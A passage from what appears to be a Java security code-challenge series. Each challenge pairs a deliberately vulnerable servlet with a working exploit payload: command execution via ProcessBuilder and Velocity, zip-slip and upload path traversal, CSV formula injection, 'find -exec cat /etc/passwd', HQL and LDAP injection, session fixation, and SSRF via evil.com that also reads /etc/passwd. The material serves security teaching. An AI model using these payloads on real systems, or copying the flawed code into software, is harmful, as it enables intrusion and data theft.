ERROR: \" + e2);      }    }  }}  The rawJson parameter in line 20 is user-controlled and parsed as JSON.  Data extracted from the JSON string is passed to the second constructor in line 21.  The parameters controllerName and data can be exploited to instantiate any object and control the first parameter of a constructor in line 26.  In line 28, the task parameter is used as a function name executed on the previously created object.  This allows an attacker to instantiate objects, control the constructor’s first argument, and invoke any parameterless function.  For exploitation, an attacker can create a ProcessBuilder with a shell command like touch hacked.jsp and then call the start() function to execute the command:rawJson={\"controller\":\"java.lang.ProcessBuilder\",\"task\":\"start\",\"data\":[\"touch\",\"hacked.jsp\"]}  The “logging” code in line 31 is a distraction and not vulnerable.Challenge 3 - Christmas Carolsimport javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.velocity.app.VelocityEngine;import org.apache.velocity.VelocityContext;import java.util.HashMap;import java.util.Map;public class TemplateRenderer {  private final VelocityEngine velocity;  public String renderFragment(String fragment, Map&lt;String,Object&gt; contextParameters) {    velocity = new VelocityEngine();    velocity.init();    VelocityContext context =  new VelocityContext(contextParameters);    StringWriter tempWriter = new StringWriter(fragment.length());    velocity.evaluate(context, tempWriter, \"renderFragment\", fragment);    return tempWriter.toString();  }  public String render(HttpServletRequest req, HttpServletResponse res) {    Map&lt;String, Object&gt; hm = new HashMap&lt;String, Object&gt;();    hm.put(\"user\", req.getParameter(\"user\"));    String template = req.getParameter(\"temp\");    String rendered = renderFragment(template,hm);    res.getWriter().println(rendered);  }}  A temp parameter is received and passed to renderFragment().  The fragment argument leads to a Code Injection vulnerability in the Velocity template.  The fragment (template) is evaluated as Java code by Velocity.  Direct Java code execution is limited.  Java reflection can be used to access Java classes and execute shell commands.user=&amp;temp=#set($s=\"\")#set($stringClass=$s.getClass()   .forName(\"java.lang.Runtime\").getRuntime()   .exec(\"touch hacked.jsp\"))$stringClassChallenge 4 - Father Christmasimport javax.servlet.http.*;public class Login extends HttpServlet {  protected void doPost(HttpServletRequest request,                        HttpServletResponse response) {    String url = request.getParameter(\"url\");    //only relative urls are allowed!    if (url.startsWith(\"/\")) {      response.sendRedirect(url);    }  }}  This code challenge receives user input via the GET or POST parameter url.  The url parameter can be used to exploit an open redirect vulnerability.  The redirect happens if url starts with /.  However, a URI starting with 2 slashes ( //attacker.org ) is not a relative URI but an absolute URI without a scheme. Therefore, the intended check if the URI is relative can be bypassed with the url parameter //attacker.org.  As a result, the server redirects the victim to attacker.org.Challenge 5 - WinterTimeimport javax.servlet.http.HttpServletRequest;import java.util.Enumeration;public class Request {  public static String toString(HttpServletRequest req) {    StringBuilder sb = new StringBuilder();    String delimiter = req.getParameter(\"delim\");    Enumeration&lt;String&gt; names = req.getParameterNames();    while (names.hasMoreElements()) {      String name = names.nextElement();      if (!name.equals(\"delim\")) {        sb.append(\"&lt;b&gt;\" + name + \"&lt;/b&gt;:&lt;br&gt;\");        String[] values = req.getParameterValues(name);        for (String val : values) {          sb.append(val);          sb.append(delimiter);          sb.append(\"&lt;br&gt;\");        }      }    }    return sb.toString();  }}  The function toString iterates over HTTP parameters and formats them into HTML representation.  The value delimiter is received and appended to the StringBuilder instance after each parameter value.  A denial of service issue may arise due to the internals of java.util.StringBuilder.  The StringBuilder object is initialized with an array of size 16.  Each time a new value is appended, the StringBuilder instance checks if the data fits into the array.  If not, the size of the array is doubled, leading to large amplification.  Apache Tomcat has a 2MB limit for POST requests and a maximum of 10000 parameters.  By submitting a large value for parameter delim and multiple HTTP parameters, we can exploit the StringBuilder internals to cause a maximum amplification of ~20000.Challenge 6 - Yuleimport java.io.*;import java.nio.file.*;import javax.servlet.http.*;public class ReadFile extends HttpServlet {  protected void doPost(HttpServletRequest request,                        HttpServletResponse response) throws IOException {    try {      String url = request.getParameter(\"url\");      String data = new String(Files.readAllBytes(Paths.get(url)));    } catch (IOException e) {      PrintWriter out = response.getWriter();      out.print(\"File not found\");      out.flush();    }    //proceed with code  }}  Untrusted user input is received from the parameter url.  A java.nio.file.Path instance is created from the given value.  The contents of the file are read by the method java.nio.file.Files.readAllBytes().  This can be used to read arbitrary files through path traversal.  The file contents are not reflected in the response.  By sending the value /dev/urandom, the application can be interrupted.  The method Files.readAllBytes() will not terminate until the Java heap is out of memory.  This leads to an infinite file read and memory exhaustion (DoS).  The IOException handler does not catch this issue.Challenge 7 - Jingle Bellsimport com.fasterxml.jackson.core.*;import javax.servlet.http.*;import java.io.*;public class ApiCache extends HttpServlet {  protected void doPost(HttpServletRequest request,                        HttpServletResponse response) throws IOException {    storeJson(request, \"/tmp/getUserInformation.json\");  }  protected void doGet(HttpServletRequest request,                       HttpServletResponse response) {    loadJson();  }  public static void loadJson() {      // Deserialize to an HashMap object with Jackson's JsonParser and read the first 2 entries of the file.  }  public static void storeJson(HttpServletRequest request, String filename) throws IOException {    JsonFactory jsonobject = new JsonFactory();    JsonGenerator jGenerator = jfactory.createGenerator(new File(filename), JsonEncoding.UTF8);    jGenerator.writeStartObject();    jGenerator.writeFieldName(\"username\");    jGenerator.writeRawValue(\"\\\"\" + request.getParameter(\"username\") + \"\\\"\");    jGenerator.writeFieldName(\"permission\");    jGenerator.writeRawValue(\"\\\"none\\\"\");    jGenerator.writeEndObject();    jGenerator.close();  }}  The username parameter is user-controlled and flows into jGenerator.writeRawValue() without sanitization.  An attacker could inject the payload ?username=foo”,”permission”:”all.  This results in a JSON object with duplicate keys: “permission”:”all” and “permission”:”none”.  If the JSON object is deserialized in method loadJson() and the method only deserializes the first occurrence of each key, the user foo can escalate privileges to “all”.  Successful exploitation depends on the implementation of loadJson().Challenge 8 - Iciclesimport java.io.File;import javax.servlet.http.*;public class GetPath extends HttpServlet {  protected void doGet(HttpServletRequest request,                       HttpServletResponse response) throws IOException {    try {      String icons = request.getParameter(\"icons\");      String filename = request.getParameter(\"filename\");      File f_icons = new File(icons);      File f_filename = new File(filename);      if (!icons.equals(f_icons.getName())) {        throw new Exception(\"File not within target directory!\");      }      if (!filename.equals(f_filename.getName())) {        throw new Exception(\"File not within target directory!\");      }      String toDir = \"/var/myapp/data/\" + f_icons.getName() + \"/\";      File file = new File(toDir, filename);      // Download file...    } catch(Exception e) {      response.sendRedirect(\"/\");    }  }}  The parameter icons flows into a File object.  It is validated and concatenated into a file path.  The check in line 14 tries to prevent path traversal by comparing the file name to the parameter icons.  The method getName() turns input like /../../../foo.txt into foo.txt, preventing simple path traversal.  However, input like .. is not removed by getName().  This allows bypassing the security check.  In combination with the parameter filename, we can traverse one directory level higher and download arbitrary files.Challenge 9 - Chestnutsimport java.io.*;import java.util.regex.*;import javax.servlet.http.*;public class Validator extends HttpServlet {  protected void doPost(HttpServletRequest request,                        HttpServletResponse response) throws IOException {    response.setContentType(\"text/plain\");    response.setCharacterEncoding(\"UTF-8\");    PrintWriter out = response.getWriter();    if (isInWhiteList(request.getParameter(\"whitelist\"), request.getParameter(\"value\"))) {      out.print(\"Value is in whitelist.\");    } else {      out.print(\"Value is not in whitelist.\");    }    out.flush();  }  public static boolean isInWhiteList(String whitelist, String value) {    Pattern pattern = Pattern.compile(\"^[\" + whitelist + \"]+\");    Matcher matcher = pattern.matcher(value);    return matcher.matches();  }}  The parameter whitelist controls a part of the regular expression pattern.  The parameter value is validated against this expression.  We can inject an arbitrary expression and control the value it’s matched against.  This allows us to produce heavy CPU consumption with a complex regular expression (ReDoS).  This can lead to CPU exhaustion and a DoS, especially in Java 8.  Proof of Concept: whitelist=x]|((((a+)+)+)+)&amp;value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaChallenge 10 - Anticipation@RequestMapping(\"/webdav\")  public void webdav(HttpServletResponse res, @RequestParam(\"name\") String name) throws IOException {    res.setContentType(\"text/xml\");    res.setCharacterEncoding(\"UTF-8\");    PrintWriter pw = res.getWriter();    name = name.replace(\"]]\", \"\");    pw.print(\"&lt;person&gt;\");    pw.print(\"&lt;name&gt;&lt;![CDATA[\" + name.replace(\" \",\"\") + \"]]&gt;&lt;/name&gt;\");    pw.print(\"&lt;/person&gt;\");  }  User input from parameter “name” is mapped to function parameter “name” via @RequestParam.  The response Content-Type is set to text/xml.  Untrusted user input can be injected into the XML response, leading to XSS.  The attacker injects a script tag with the “http://www.w3.org/1999/xhtml” namespace.  Escaping the CDATA element is bypassed with a space between “]]”.  Tabs are used for other spaces needed in the payload.  The provided payload demonstrates exploiting this vulnerability.The following payload can be used to exploit this challenge:test] ]&gt;&lt;something%3Ascript%09xmlns%3Asomething%3D\"http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml\"&gt;alert(1)&lt;%2Fsomething%3Ascript&gt;&lt;![CDATA[Challenge 11 - Carolersimport javax.servlet.http.*;import java.io.*;import java.nio.file.Files;import org.apache.commons.compress.archivers.ArchiveStreamFactory;import org.apache.commons.compress.archivers.tar.*;import org.apache.commons.io.IOUtils;public class ExtractFiles extends HttpServlet {  private static void extract() throws Exception {    // /tmp/uploaded.tar is user controlled and an uploaded file.    final InputStream is = new FileInputStream(new File(\"/tmp/uploaded.tar\"));    final TarArchiveInputStream tarInputStream = (TarArchiveInputStream) (new ArchiveStreamFactory().createArchiveInputStream(ArchiveStreamFactory.TAR, is));    File tmpDir = Files.createTempDirectory(\"test\").toFile();    TarArchiveEntry entry;    while ((entry = tarInputStream.getNextTarEntry()) != null) {      File file = new File(tmpDir, entry.getName().replace(\"../\", \"\"));      if (entry.isDirectory()) {        file.mkdirs();      } else {        IOUtils.copy(tarInputStream, new FileOutputStream(file));      }    }    is.close();    tarInputStream.close();  }}  The code extracts a TAR file into a temporary directory.  The user controls the contents of /tmp/uploaded.tar.  A TAR file is an archive of files and folders, each represented by a TarArchiveEntry object.  The attacker can control the filename of a TarArchiveEntry using TarArchiveEntry.getName().  The user input reaches the sensitive sink java.io.File in line 16.  This can lead to a path traversal (zip slip) attack.  The sanitization in line 16 is insufficient, as it only removes ../.  The following payload can bypass the sanitization on a Linux system with a Tomcat server: ..././..././..././..././..././var/tomcat/webapps/ROOT/index.jspChallenge 12 - Evergreenindex.jsp&lt;%@ page import=\"org.owasp.esapi.ESAPI\" %&gt;&lt;%! String customClass = \"default\"; %&gt;&lt;html&gt;&lt;body&gt;&lt;%@ include file=\"init.jsp\" %&gt;&lt;div class=\"&lt;%= customClass %&gt;\"&gt;  &lt;%! String username; %&gt;  &lt;% username = request.getParameter(\"username\"); %&gt;  Welcome citizen, you have been identified as  &lt;%    customClass = request.getParameter(\"customClass\");    customClass = ESAPI.encoder().encodeForHTML(customClass);  %&gt;  &lt;div class=\"&lt;%= customClass %&gt;\"&gt;  &lt;%= ESAPI.encoder().encodeForHTML(username) %&gt;.&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;init.jsp&lt;% customClass = request.getParameter(\"customClass\"); %&gt;  A class is dynamically assigned to a div element in line 5.  The class is derived from the customClass variable.  customClass is initially set to “default” but is overwritten by the contents of init.jsp.  init.jsp fetches user input and assigns it directly to customClass without sanitization.  This allows an attacker to control the class attribute of the div element.  A simple double quote can be used to break out of the attribute.  Other user input instances are properly sanitized with an ESAPI encoder.Challenge 13 - Epiphanyimport javax.servlet.http.*;import java.io.*;import java.util.List;import org.apache.commons.fileupload.FileItem;import org.apache.commons.fileupload.disk.DiskFileItemFactory;import org.apache.commons.fileupload.servlet.ServletFileUpload;public class UploadFileController extends HttpServlet {  protected void doPost(HttpServletRequest request,                        HttpServletResponse response) throws IOException {    DiskFileItemFactory factory = new DiskFileItemFactory();    factory.setRepository(new File(System.getProperty(\"java.io.tmpdir\")));    ServletFileUpload upload = new ServletFileUpload(factory);    String uploadPath = getServletContext().getRealPath(\"\") + \"upload\";    File uploadDir = new File(uploadPath);    if (!uploadDir.exists()) {      uploadDir.mkdir();    }    try {      List&lt;FileItem&gt; items = upload.parseRequest(request);      if (items != null &amp;&amp; items.size() &gt; 0) {        for (FileItem item : items) {          if (!item.isFormField()) {            if (!(item.getContentType().equals(\"text/plain\"))) {              throw new Exception(\"ContentType mismatch\");            }            String file = uploadPath + File.separator + item.getName();            File storeFile = new File(file);            item.write(storeFile);          }        }      }    } catch (Exception ex) {      response.sendRedirect(\"/\");    }  }}  The challenge involves a multi-part file upload.  The uploaded file must have a content type of text/plain.  A content type check is in place to prevent dangerous file uploads (line 26).  However, the attacker controls the content type and can easily bypass the check.  The filename of the uploaded file is also user-controlled (line 28).  This leads to a Path Traversal vulnerability due to the acceptance of /../ in filenames.  By combining the content type bypass and Path Traversal, an attacker can upload arbitrary files and execute remote commands.Content-Disposition: form-data; name=\"uploadFile\"; filename=\"../../../hacked.jsp\"Content-Type: text/plainChallenge 14 - Chimneyimport java.io.PrintWriter;import java.util.*;import javax.servlet.http.*;public class Export extends HttpServlet {  protected void doPost(HttpServletRequest request,                        HttpServletResponse response) throws IOException {    response.setContentType(\"text/csv\");    response.setCharacterEncoding(\"UTF-8\");    PrintWriter out = response.getWriter();    String content = buildCSV(request);    out.print(content);    out.flush();  }  public String buildCSV(HttpServletRequest request) {    {      StringBuilder str = new StringBuilder();      List&lt;List&lt;String&gt;&gt; rows = Arrays.asList(        Arrays.asList(\"Scott\", \"editor\", request.getParameter(\"description\"))      );      str.append(\"Name\");      str.append(\",\");      str.append(\"Role\");      str.append(\",\");      str.append(\"Description\");      str.append(\"\\n\");      for (List&lt;String&gt; rowData : rows) {        str.append(String.join(\",\", rowData));        str.append(\"\\n\");      }      return str.toString();    }  }}  The servlet exports a CSV file containing unfiltered user input.  This leads to a Formula Injection vulnerability.  The description parameter (line 22) is directly added to the StringBuilder in line 33 without sanitization.  An attacker can inject a payload like =cmd|'C calc.exe'!Z0 via the description parameter.  This results in a CSV file with malicious formulas that can execute commands.Challenge 15 - Mistletoeimport org.apache.commons.io.IOUtils;import javax.servlet.http.*;import java.io.*;import java.util.*;public class FindOnSystem extends HttpServlet {  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {    try {      String[] binary = {\"find\", \".\", \"-type\", \"d\"};      ArrayList&lt;String&gt; cmd = new ArrayList&lt;&gt;(Arrays.asList(binary));      String[] options = request.getParameter(\"options\").split(\" \");      for (String i : options) {        cmd.add(i);      }      ProcessBuilder processBuilder = new ProcessBuilder(cmd);      Process process = processBuilder.start();      IOUtils.copy(process.getInputStream(),response.getOutputStream());    } catch(Exception e) {      response.sendRedirect(\"/\");    }  }}  The servlet uses the find system command to list directories.  This exposes directory information, leading to an information leak.  The base command is find . -type d (lines 9-10).  User-controlled options are appended to the command (lines 12-15).  The command is executed using java.lang.ProcessBuilder (lines 17-18).  While direct command injection is not possible, an Argument Injection vulnerability exists.  The -exec parameter can be injected to execute arbitrary commands.  A payload like ?options=-exec cat /etc/passwd ; leads to the execution of find . -type d -exec cat /etc/passwd ;.Challenge 16 - Candlesimport java.io.Serializable;import javax.persistence.*;@Entity@DynamicUpdate@Table(name = \"UserEntity\", uniqueConstraints = {        @UniqueConstraint(columnNames = \"ID\"),        @UniqueConstraint(columnNames = \"EMAIL\") })public class UserEntity implements Serializable {  public UserEntity(String email, String firstName, String lastName) {    this.email = email;    this.firstName = firstName;    this.lastName = lastName;  }  private static final long serialVersionUID = -1798070786993154676L;  @Id  @GeneratedValue(strategy = GenerationType.IDENTITY)  @Column(name = \"ID\", unique = true, nullable = false)  private Integer userId;  @Column(name = \"EMAIL\", unique = true, nullable = false, length = 100)  private String email;  @Column(name = \"FIRST_NAME\", unique = false, nullable = false, length = 100)  private String firstName;  @Column(name = \"LAST_NAME\", unique = false, nullable = false, length = 100)  private String lastName;}import org.hibernate.*;import org.springframework.web.bind.annotation.RequestParam;public class FindController {  public String escapeQuotes(String in){    return in.replaceAll(\"'\",\"''\");  }  @RequestMapping(\"/findUsers\")  public void findUsers(@RequestParam(name=\"name\") String name, HttpServletResponse res) throws IOException{    Configuration config = new Configuration();    // Create SessionFactory with MySQL driver    SessionFactory sessionFactory = config.configure().buildSessionFactory();    Session session = sessionFactory.openSession();    List &lt;UserEntity&gt; users = session.createQuery(\"from UserEntity where FIRST_NAME ='\" + escapeQuotes(name) + \"'\", UserEntity.class).list();    res.getWriter().println(\"Found \" + users.size() + \" Users with that name\");  }}  User input is received via the @RequestParam annotation and mapped to the name parameter of the findUsers method.  A Hibernate Session is created using the MySQL driver.  A HQL query is executed to retrieve UserEntity objects based on a user-supplied filter.  The escapeQuotes method is used to escape single quotes within the string literal.  However, the escaping is insufficient to prevent HQL injection.  An attacker can inject a payload like test\\' or 1=sleep(1) -- - to bypass the escaping.  This payload allows the execution of arbitrary MySQL queries.  The injected query will be sent to the database: ... where FIRST_NAME='test\\'' or 1=sleep(5)-- -'.Challenge 17 - Carol Singersimport java.io.IOException;import java.lang.reflect.Field;import java.util.*;import java.util.regex.Pattern;import javax.servlet.http.*;public class JavaDeobfuscatorStartupController extends HttpServlet {  private static boolean isInBlacklist(String input) {    String[] blacklist = {\"java\",\"os\",\"file\"};    return Arrays.asList(blacklist).contains(input);  }  private static void setEnv(String key, String value) {    String[] values = key.split(Pattern.quote(\".\"));    if (isInBlacklist(values[0])) {      return;    }    List&lt;String&gt; list = new ArrayList&lt;&gt;(Arrays.asList(values));    list.removeAll(Arrays.asList(\"\", null));    String property = String.join(\".\", list);    System.setProperty(property, value);  }  private static void loadEnv(HttpServletRequest request) {    Cookie[] cookies = request.getCookies();    for (int i = 0; i &lt; cookies.length; i++)      if (cookies[i].getName().equals(\"env\")) {        String[] tmp = cookies[i].getValue().split(\"@\", 2);        setEnv(tmp[0], tmp[1]);      }    }  private static void uploadFile() {    // Secure file upload with arbitrary content type and extension in known path /var/myapp/data  }  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {    loadEnv(request);    try {      final Field sysPathsField = ClassLoader.class.getDeclaredField(\"sys_paths\");      sysPathsField.setAccessible(true);      sysPathsField.set(null, null);      System.loadLibrary(\"DEOBFUSCATION_LIB\");    } catch (Exception e) {      response.sendRedirect(\"/\");    }  }}  The loadEnv method (line 39) processes the user-controlled cookie env (lines 26-29).  Inside loadEnv, setEnv is called with user-controlled key/value pairs (line 30).  The key is split by “.” and a blacklist check is done on the first element (line 15) to prevent setting system properties like java.  The blacklist check can be bypassed with a payload like .java.xxx.  Only the first element is checked, and empty strings are allowed (line 9/10).  After the check, empty values are removed and the remaining parts are joined with “.” again (line 20).  The attacker’s goal is to set java.library.path (line 22) to /var/myapp/data for Library Injection.  This path allows uploading a malicious library named libDEOBFUSCATION_LIB.so (line 34).  The library filename needs the prefix “lib” and suffix “.so” for System.loadLibrary to load it (line 44).  POC: 1. Upload file: curl -v -F ‘upload=@/tmp/libDEOBFUSCATION_LIB.so’ http://victim.org/`  POC 2. Load malicious library: curl -v --cookie 'env=.java.library.path@/var/myapp/data'Challenge 18 - Reindeerimport org.apache.tomcat.util.http.fileupload.IOUtils;import javax.servlet.http.*;import java.util.HashMap;public class LoadConfig extends HttpServlet {  public static HashMap&lt;String, String&gt; parseRequest(String value) {    HashMap&lt;String, String&gt; result = new HashMap&lt;String, String&gt;();    if (value != null) {      String tmp[] = value.split(\"@\");      for (int i = 0; i &lt; tmp.length; i = i + 2) {        result.put(tmp[i], tmp[i + 1]);      }    }    return result;  }  protected void doGet(HttpServletRequest request, HttpServletResponse response) {    if (request.getParameter(\"home\") != null) {      HttpSession session = request.getSession(true);      if (!session.isNew()){        if (validBasicAuthHeader()) { // Checks the Basic Authorization header (password check)          // Execute last command:          ProcessBuilder processBuilder = new ProcessBuilder();          processBuilder.command((String)session.getAttribute(\"last_command\"));          try {            Process process = processBuilder.start();            IOUtils.copy(process.getInputStream(), response.getOutputStream());          }          catch (Exception e){            return;          }        }      }    } else if (request.getParameter(\"save_session\") != null) {      String value = request.getParameter(\"config\");      HashMap&lt;String, String&gt; config = parseRequest(value);      for (String i : config.keySet()) {        Cookie settings = new Cookie(i, config.get(i));        response.addCookie(settings);      }    } else {      HttpSession session = request.getSession(true);      if (session.isNew()) {        HashMap&lt;String, String&gt; whitelist = new HashMap&lt;String, String&gt;();        whitelist.put(\"home\", \"yes\");        whitelist.put(\"role\", \"frontend\");        String value = request.getParameter(\"config\");        HashMap&lt;String, String&gt; config = parseRequest(value);        whitelist.putAll(config);        for (String i : whitelist.keySet()) {          session.setAttribute(i, whitelist.get(i));        }      }    }  }}  The code is vulnerable to both Session Fixation and Command Injection.  Upon visiting the application, a new session is created with user-controlled session variables (lines 43-54).  Attackers can manipulate these variables by providing key-value pairs in the config parameter (line 49).  This allows them to control their own session variables, including setting \"last_command\".  However, a password is required via the authorization header for command execution (lines 21, 23-26).  Leveraging the Session Fixation vulnerability (lines 35-39), an attacker can hijack the admin’s session.  This is achieved by sending a link with config set to a specific session ID (e.g., curl \"http://victim.org/?config=JSESSIONID@D4E9132DB9703009B1C932E7C37286ED\").  With the admin’s session hijacked, the attacker can execute their previously stored shell command via last_command without needing the password.Challenge 19 - Gingerbreadimport javax.script.ScriptEngineManager;import javax.servlet.http.*;import javax.script.ScriptEngine;import java.io.IOException;import java.util.regex.*;public class RenderExpression extends HttpServlet {  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {    try {      ScriptEngineManager scriptEngineManager = new ScriptEngineManager();      ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension(\"js\");      String dynamiceCodeHere = request.getParameter(\"p\");      if (!dynamiceCodeHere.startsWith(\"\\\"\")) {        throw new Exception();      }      Pattern p = Pattern.compile(\"([^\\\".()'\\\\/,a-zA-z\\\\s\\\\\\\\])|(processbuilder|file|url|runtime|getclass|forname|loadclass|new\\\\s)\");      Matcher m = p.matcher(dynamiceCodeHere.toLowerCase());      if (m.find()) {        throw new Exception();      }      scriptEngine.eval(dynamiceCodeHere);      // Proceed    } catch(Exception e) {      response.sendRedirect(\"/\");    }  }}  The parameter p is received in line 13 and evaluated in line 24, triggering an Expression Language Injection (ELI) vulnerability.  To prevent ELI, a check for quotes is implemented (lines 14-16) as strings usually start with quotes in this language.  Additionally, a regular expression blacklist is applied (lines 18-22) to block dangerous classes and constructs used for code execution.  However, the blacklist can be bypassed due to Java’s flexibility.  Reflection can be used to call the javax.scripts.ScriptEngineManager class, bypassing the blacklist.  While eval expects a string, the string can be encoded for code injection.  A possible payload exploiting reflection and string encoding could look like this:victim.org/?p=\"\".equals(javax.script.ScriptEngineManager.class.getConstructor().newInstance().getEngineByExtension(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\"touch /tmp/owned.jsp\\\")\".replaceAll(\"A\",\"R\")))Challenge 20 - Ornamentsimport javax.naming.*;import javax.naming.directory.*;import java.util.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;public class UserController extends HttpServlet {  // This token is SHA-256(createTimestamp of admin user)  private static final String api_token = \"1c4e98fc43d0385e67cd6de8c32f969f371eba8ab84053858b5bfd21a2adb471\";  private static void executeCommand(String user_token, String[] cmd) {    if (user_token.equals(api_token)) {      // Execute shell command    }  }  /**   * Current attributes of objectClass \"simpleSecurityObject\":   * createtimestamp, creatorsname, dn, entrycsn, entrydn, entryuuid, objectclass, userpassword, uuid   */  private static DirContext initLdap() throws NamingException {    Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();    env.put(Context.SECURITY_AUTHENTICATION, \"simple\");    env.put(Context.SECURITY_PRINCIPAL, \"cn=admin,dc=example,dc=org\");    env.put(Context.SECURITY_CREDENTIALS, \"admin\");    env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");    env.put(Context.PROVIDER_URL, \"ldap://127.0.0.1:389/\");    return new InitialDirContext(env);  }  private static boolean userExists(DirContext ctx, String username) throws Exception {    String[] security_blacklist = {\"uuid\", \"userpassword\", \"surname\", \"mail\", \"givenName\", \"name\", \"cn\", \"sn\", \"objectclass\", \"|\", \"&amp;\"};    for (String name : security_blacklist) {      if (username.contains(name)) {        throw new Exception();      }    }    String searchFilter = \"(&amp;(objectClass=simpleSecurityObject)(uid=\"+username+\"))\";    SearchControls searchControls = new SearchControls();    searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);    NamingEnumeration&lt;SearchResult&gt; results = ctx.search(\"dc=example,dc=org\", searchFilter, searchControls);    if (results.hasMoreElements()) {      SearchResult searchResult = (SearchResult) results.nextElement();      return searchResult != null;    }    return false;  }  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {    try {      DirContext ctx = initLdap();      if(userExists(ctx, request.getParameter(\"username\"))){        response.getOutputStream().print(\"User is found.\");        response.getOutputStream().close();      }    } catch (Exception e) {      response.sendRedirect(\"/\");    }  }}  The username parameter (line 54) is passed to the userExists() method.  The method checks if the user exists in the LDAP directory (lines 32-49).  The username is added to a filter string to query the LDAP server (line 40).  The query checks for an attribute uid matching the username (line 40).  The LDAP query result determines the return value of userExists() (line 46).  A blacklist is used to prevent certain attributes from being queried (lines 33-38).  However, the createtimestamp attribute is not in the blacklist.  By injecting payloads like ?username=admin)(createtimestamp=2* or ?username=admin)(createtimestamp=20*, an attacker can leak information about the admin user’s createtimestamp.  This information can be used to generate an API token (line 10) and execute arbitrary commands via the executeCommand() method (line 14).Challenge 21 - Snowmanimport javax.crypto.*;import javax.crypto.spec.*;import org.apache.commons.codec.binary.Hex;public class Decrypter{ @RequestMapping(\"/decrypt\")  public void decrypt(HttpServletResponse req, HttpServletResponse res) throws IOException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, NoSuchPaddingException, DecoderException, InvalidKeySpecException {    // Payload to decrypt: 699c99a4f27a4e4c310d75586abe8d32a8fc21a1f9e400f22b1fec7b415de5a4    byte[] cipher = Hex.decodeHex(req.getParameter(\"c\"));    byte[] salt = new byte[]{(byte)0x12,(byte)0x34,(byte)0x56,(byte)0x78,(byte)0x9a,(byte)0xbc,(byte)0xde};    // Extract IV.    byte[] iv = new byte[16];    System.arraycopy(cipher, 0, iv, 0, iv.length);    IvParameterSpec ivParameterSpec = new IvParameterSpec(iv);    byte[] encryptedBytes = new byte[cipher.length - 16];    System.arraycopy(cipher, 16, encryptedBytes, 0, cipher.length - 16);    SecretKeyFactory factory = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA256\");    // Of course the password is not known by the attacker - just for testing purposes    KeySpec spec = new PBEKeySpec(\"SuperSecurePassword\".toCharArray(), salt, 65536, 128);    SecretKey key = factory.generateSecret(spec);    SecretKeySpec secretKeySpec = new SecretKeySpec(key.getEncoded(), \"AES\");    // Decrypt.    try {      Cipher cipherDecrypt = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");      cipherDecrypt.init(Cipher.DECRYPT_MODE, secretKeySpec, ivParameterSpec);      byte[] decrypted = cipherDecrypt.doFinal(encryptedBytes);      // Do something.    } catch (BadPaddingException e) {      res.getWriter().println(\"Invalid Padding!!\");    }  }}  The decrypt method attempts to decrypt user-provided hex-encoded ciphertext using an insecure AES algorithm (line 27).  The attacker knows the encrypted ciphertext (line 10) but not the encryption key.  Since the ciphertext lacks Message Authentication Code (MAC) or signature protection, the attacker can manipulate the Initialization Vector (IV, first 16 bytes of ciphertext).  This manipulation exploits CBC mode malleability to trigger a BadPaddingException.  By leveraging a Padding Oracle attack, the attacker can decrypt the ciphertext without the key.  This attack might require up to 16 * 256 requests to decrypt a single block.  For more information on Padding Oracle attacks, refer to: https://www.owasp.org/images/e/eb/Fun_with_Padding_Oracles.pdf.Challenge 22 - Fruitcakeimport org.apache.commons.io.IOUtils;import java.net.*;import javax.servlet.http.*;public class ReadExternalUrl extends HttpServlet {  private static URLConnection getUrl(String target) {    try{      // Don't allow redirects:      HttpURLConnection.setFollowRedirects(false);      URL url = new URL(target);      if(!url.getProtocol().startsWith(\"http\"))        throw new Exception(\"Must start with http!.\");      InetAddress inetAddress = InetAddress.getByName(url.getHost());      if (inetAddress.isAnyLocalAddress() || inetAddress.isLoopbackAddress() || inetAddress.isLinkLocalAddress())        throw new Exception(\"No local urls allowed!\");      HttpURLConnection conn = (HttpURLConnection) url.openConnection();      return conn;    }    catch (Exception e) {      return null;    }  }  protected void doGet(HttpServletRequest request,                       HttpServletResponse response) {    try{      URLConnection conn = getUrl(request.getParameter(\"url\"));      conn.connect();      String redirect = conn.getHeaderField(\"Location\");      if(redirect != null) {        URL url = new URL(redirect);        if(redirect.indexOf(\"http://\") == -1) {          throw new Exception(\"No http found!\");        }        if(getUrl(redirect.substring(redirect.indexOf(\"http://\"))) != null) {          conn = url.openConnection();          conn.connect();        }      }      // Output content of url      IOUtils.copy(conn.getInputStream(),response.getOutputStream());    }    catch (Exception e) {      System.exit(-1);    }  }}  The code retrieves a URL using the getUrl method (line 31).  Initial checks ensure the URL starts with “http” (line 13) and is a valid external URL (line 17).  Redirects are also disabled (line 10).  However, the code allows a single redirect via the “Location” header (lines 33-43).  An attacker can control the URL parameter and inject a malicious “Location” header.  A simple payload like victim.org?url=http://evil.com/ can bypass the second check (line 39) due to incomplete validation.  The check only examines the content after “http” (e.g., “google.com” in this case).  Though intended to fetch “https://localhost/”, the request ends up at “https://localhost/?x=http://google.com” (line 40/41).  The response body is printed (line 45), demonstrating a classic SSRF vulnerability.  But there’s more! The attacker can also exploit this as a File Read vulnerability.  By injecting Location: file:///etc/passwd#http://google.com, the code attempts to read the local “/etc/passwd” file, potentially leaking sensitive information.Challenge 23 - Ivyimport javax.servlet.http.*;import java.io.*;import java.text.*;import java.util.*;import org.apache.commons.lang3.StringEscapeUtils;public class ShowCalendar extends HttpServlet {  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {    try {      response.setContentType(\"text/html\");      GregorianCalendar calendar = new GregorianCalendar();      SimpleTimeZone x = new SimpleTimeZone(0, request.getParameter(\"id\"));      SimpleDateFormat parser=new 